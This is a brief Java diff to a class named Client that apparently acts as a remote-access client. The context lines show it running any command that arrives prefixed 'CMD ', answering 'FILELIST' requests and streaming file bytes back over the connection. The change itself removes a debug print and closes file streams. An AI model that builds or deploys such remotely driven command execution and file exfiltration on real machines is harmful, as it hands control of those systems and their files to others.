@@ -67,7 +67,6 @@ public class Client {
                 } catch (EOFException e) {
                     break;
                 }
-                System.out.println(input);
                 if (input.contains("CMD ")) {
                     exec(input.replace("CMD ", ""));
                 } else if (input.contains("FILELIST")) {
@@ -213,6 +212,8 @@ public class Client {
             while ((fbyte = bs.read()) != -1) {
                 dos.writeInt(fbyte);
             }
+            bs.close();
+            fis.close();
         } catch (IOException e) {
             e.printStackTrace();
         }
